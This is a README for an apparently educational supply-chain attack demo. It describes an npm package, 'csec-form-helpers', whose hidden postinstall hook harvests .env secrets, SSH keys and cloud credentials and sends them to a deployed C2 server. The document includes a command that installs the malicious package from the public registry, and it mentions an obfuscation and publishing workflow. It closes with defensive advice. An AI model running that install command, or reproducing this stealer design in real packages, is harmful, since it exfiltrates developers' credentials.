# Token Stealer — Supply Chain Attack Demo

## The Concept

A developer has a project with secrets stored in a `.env` file — GitHub tokens, AWS keys, database URLs. Normal practice. They search for a form validation library, find **"csec-form-helpers"** on npm, and install it.

**The victim sees absolutely nothing suspicious.** Normal npm output. Zero warnings. The package works exactly as documented.

What actually happened: the package has a `postinstall` hook that runs silently during `npm install`. In under a second, it:

1. **Crawls the project directory tree** looking for `.env`, `.env.local`, `.env.production` files
2. **Parses every key=value pair** from those files
3. Harvests system info (hostname, username, OS, IP addresses, MAC)
4. Reads sensitive files (`~/.ssh/id_rsa`, `~/.aws/credentials`, `~/.npmrc`)
5. Sends **EVERYTHING** to the attacker's C2 server — silently, with zero output

The developer runs their app. Everything works. They have **no idea** their `.env` was just exfiltrated.

---

## Architecture

The C2 server is deployed on Render with a Neon PostgreSQL database. Victims don't need to be on the same network as the attacker — exfiltrated data is sent to the cloud.

```
Victim machine                         Cloud (Render)
┌────────────────────┐     POST /e     ┌──────────────────┐
│ npm install         │ ──────────────► │ C2 Server        │
│ csec-form-helpers   │                 │ (server.js)      │
│                     │                 │   ├─ Dashboard    │
│ postinstall.js runs │                 │   └─ /api/victims│
│ silently, reads     │                 └────────┬─────────┘
│ .env, ~/.ssh, etc.  │                          │
└────────────────────┘                  ┌────────▼─────────┐
                                        │ Neon PostgreSQL   │
                                        │ (victims table)   │
                                        └──────────────────┘
```

---

## Running the Demo

### 1. Open the C2 Dashboard

The C2 server is already deployed. Open the dashboard in your browser and log in.

### 2. Be the Victim (any machine)

```bash
mkdir my-project && cd my-project
npm init -y

# Add fake secrets
cat > .env << 'EOF'
GITHUB_TOKEN=ghp_R3aLt0k3nF0rD3m0Purp0s3s1234567890
NPM_TOKEN=npm_aB9xKzLmN8pQrStUvWx7654321fedcba
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
DATABASE_URL=postgres://admin:s3cret@prod-db.internal:5432/myapp
EOF

# Install the malicious package
npm install csec-form-helpers

# Use it — works perfectly
node -e "const f = require('csec-form-helpers'); console.log('Email valid:', f.validateEmail('test@example.com'))"
```

### 3. The Reveal

Switch to the C2 dashboard. Every secret from the `.env` file is displayed, along with hostname, IP, MAC, SSH keys, and cloud credentials.

---

## Files

| Directory | Role |
|-----------|------|
| `c2-server/` | Attacker's C2 server + dashboard (deployed on Render) |
| `c2-server/db.js` | Neon PostgreSQL persistence layer |
| `malicious-package/` | The malicious npm package (readable, educational version) |
| `malicious-package/postinstall.js` | **THE PAYLOAD** — parses .env, reads sensitive files, exfiltrates silently |
| `malicious-package/index.js` | Legitimate form validation code (the cover story) |
| `npm-publish/` | Publishing workflow — obfuscation, build scripts, publish/unpublish to npm |

## Key Takeaway

> The `postinstall` hook runs with YOUR user privileges. It can read any file you can read — including `.env`, `~/.ssh/id_rsa`, `~/.aws/credentials`. **Zero output. Zero indication. Your secrets are gone.**
>
> **Defense:** `npm install --ignore-scripts`, never store secrets in plain `.env` (use vaults), pin dependencies, audit with `npm audit` / Socket.dev.
